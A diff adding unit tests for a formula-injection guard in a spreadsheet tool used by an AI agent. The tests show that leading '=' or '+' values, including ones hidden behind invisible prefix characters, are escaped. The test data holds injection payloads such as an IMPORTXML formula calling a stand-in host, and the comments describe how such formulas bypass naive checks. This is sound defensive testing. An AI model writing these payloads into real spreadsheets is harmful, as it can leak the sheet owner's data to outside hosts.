@@ -318,3 +318,121 @@ describe("tab lifecycle", () => {
     expect(rename?.annotations).toEqual(CREATE("Rename a spreadsheet tab"));
   });
 });
+
+/** An agent writing to a sheet is usually writing text it read somewhere the
+ * sheet's owner does not control. Sheets formulas reach the network, so a
+ * leading `=` turns "log this in my tracker" into an exfiltration primitive. */
+describe("formula injection guard", () => {
+  it.each([
+    ["sheets_update", { spreadsheet_id: "s", range: "Sheet1!A1" }],
+    ["sheets_append", { spreadsheet_id: "s" }],
+  ])("%s escapes values that would execute", async (tool, base) => {
+    const { client, calls } = fakeClient([{ data: {} }]);
+
+    await handleSheets(client, tool, {
+      ...base,
+      values: [["=IMPORTXML(\"https://evil.test\",\"//a\")", "+1+1"]],
+    });
+
+    // Sheets strips the leading apostrophe on read, so the stored value is
+    // the original string — the caller sees no difference, the formula never
+    // runs. Measured: `=` and `+` execute; `-`, `@` and a leading space do not.
+    expect(calls[0].jsonBody).toEqual({
+      values: [["'=IMPORTXML(\"https://evil.test\",\"//a\")", "'+1+1"]],
+    });
+  });
+
+  it.each([
+    ["sheets_update", { spreadsheet_id: "s", range: "Sheet1!A1" }],
+    ["sheets_append", { spreadsheet_id: "s" }],
+  ])("%s leaves harmless values untouched", async (tool, base) => {
+    const { client, calls } = fakeClient([{ data: {} }]);
+
+    await handleSheets(client, tool, {
+      ...base,
+      values: [["-1-1", "@SUM(1,2)", "2026-08-05", "5", ""]],
+    });
+
+    expect(calls[0].jsonBody).toEqual({
+      values: [["-1-1", "@SUM(1,2)", "2026-08-05", "5", ""]],
+    });
+  });
+
+  it("still writes USER_ENTERED, so numbers stay numbers", async () => {
+    const { client, calls } = fakeClient([{ data: {} }]);
+
+    await handleSheets(client, "sheets_append", {
+      spreadsheet_id: "s",
+      values: [["5", "10"]],
+    });
+
+    // RAW would neutralise the same attack, but silently: =SUM() over
+    // RAW-written numbers returns 0, not the total and not an error.
+    expect(calls[0].params).toMatchObject({ valueInputOption: "USER_ENTERED" });
+  });
+
+  it("writes a real formula when the caller explicitly asks for one", async () => {
+    const { client, calls } = fakeClient([{ data: {} }]);
+
+    await handleSheets(client, "sheets_update", {
+      spreadsheet_id: "s",
+      range: "Sheet1!C1",
+      values: [["=SUM(A1:B1)"]],
+      parse_formulas: true,
+    });
+
+    expect(calls[0].jsonBody).toEqual({ values: [["=SUM(A1:B1)"]] });
+  });
+
+  it("offers the opt-out on both writing tools", () => {
+    // A guard with no documented way past it gets worked around with gws_run,
+    // which has no guard at all.
+    for (const name of ["sheets_update", "sheets_append"]) {
+      const tool = sheetsTools.find((t) => t.name === name);
+      expect(tool?.inputSchema.properties).toHaveProperty("parse_formulas");
+    }
+  });
+});
+
+/** The raw-first-character version of this guard let invisible-prefixed
+ * payloads through. A plain leading space was measured inert in Sheets; BOM
+ * was NOT, and BOM is a format character rather than whitespace, which is the
+ * evidence that Sheets skips leading zero-width characters before parsing.
+ *
+ * The zero-width cases below were not measured against the live API. They are
+ * covered because the escape is lossless: guessing wide costs an apostrophe
+ * Sheets strips on read, guessing narrow costs an injection. */
+describe("formula guard ignores leading invisible characters", () => {
+  it.each([
+    ["tab", "\t=IMPORTXML(\"https://evil.test\",\"//a\")"],
+    ["newline", "\n=1+1"],
+    ["zwsp", "​=IMPORTXML(\"https://evil.test\",\"//a\")"],
+    ["zwnj", "‌=1+1"],
+    ["word joiner", "⁠=1+1"],
+    ["soft hyphen", "­=1+1"],
+    ["bidi mark", "‎=1+1"],
+    ["nbsp", " =1+1"],
+    ["bom", "﻿=1+1"],
+    ["plain space", " +1+1"],
+  ])("escapes a %s-prefixed formula", async (_label, payload) => {
+    const { client, calls } = fakeClient([{ data: {} }]);
+    await handleSheets(client, "sheets_append", {
+      spreadsheet_id: "s",
+      values: [[payload]],
+    });
+    expect((calls[0].jsonBody as { values: string[][] }).values[0][0]).toBe(
+      `'${payload}`
+    );
+  });
+
+  it("does not escape whitespace-only or ordinary text", async () => {
+    const { client, calls } = fakeClient([{ data: {} }]);
+    await handleSheets(client, "sheets_append", {
+      spreadsheet_id: "s",
+      values: [["   ", "  hello", "-1-1", ""]],
+    });
+    expect(calls[0].jsonBody).toEqual({
+      values: [["   ", "  hello", "-1-1", ""]],
+    });
+  });
+});
